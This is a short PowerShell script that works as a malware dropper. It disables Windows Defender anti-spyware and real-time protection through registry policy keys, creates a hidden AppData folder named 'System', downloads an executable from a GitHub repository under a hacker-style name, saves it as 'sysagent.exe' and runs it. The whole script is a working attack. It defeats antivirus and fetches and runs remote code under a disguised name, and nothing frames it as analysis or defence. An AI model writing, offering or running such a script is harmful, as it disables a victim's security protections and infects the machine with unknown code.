# Disable Windows Defender via Registry

# Disable AntiSpyware (Windows Defender)
$DefenderRegistryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$DisableAntiSpyware = "DisableAntiSpyware"
$Value = 1

if (-not (Test-Path $DefenderRegistryKey)) {
    New-Item -Path $DefenderRegistryKey -Force
}
Set-ItemProperty -Path $DefenderRegistryKey -Name $DisableAntiSpyware -Value $Value

# Disable Real-time Protection
$RealTimeProtectionRegistryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
$DisableRealTimeMonitoring = "DisableRealtimeMonitoring"
$Value = 1

if (-not (Test-Path $RealTimeProtectionRegistryKey)) {
    New-Item -Path $RealTimeProtectionRegistryKey -Force
}
Set-ItemProperty -Path $RealTimeProtectionRegistryKey -Name $DisableRealTimeMonitoring -Value $Value



# Create hidden folder in AppData and download .exe file


$AppDataPath = "$env:APPDATA\System"

# Check if the directory exists; if not, create it
if (-not (Test-Path $AppDataPath)) {
    New-Item -ItemType Directory -Path $AppDataPath -Force
}

# Set the folder as hidden
Set-ItemProperty -Path $AppDataPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Define the URL of the .exe file and the destination path
$exeUrl = "https://github.com/Darkhaxxor005/host/raw/refs/heads/main/g.exe"  # Replace with the actual URL of the .exe
$exePath = "$AppDataPath\sysagent.exe"

# Download the .exe file
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute the downloaded .exe file
Start-Process -FilePath $exePath

